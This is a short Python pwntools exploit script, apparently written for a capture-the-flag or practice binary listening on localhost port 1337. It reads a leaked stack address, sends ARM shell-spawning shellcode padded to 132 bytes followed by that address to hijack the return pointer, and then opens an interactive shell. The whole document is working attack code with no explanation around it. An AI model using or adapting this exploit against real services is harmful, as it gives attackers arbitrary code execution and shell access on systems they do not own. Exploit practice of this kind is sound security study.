from pwn import *

context.arch = "arm"

p = remote("localhost", 1337)
p.recvuntil(b"at ")
buf = int(p.recvlineS(), 16)
payload = asm(shellcraft.sh()).ljust(132, b"A")
p.sendline(payload + p64(buf))
p.interactive()
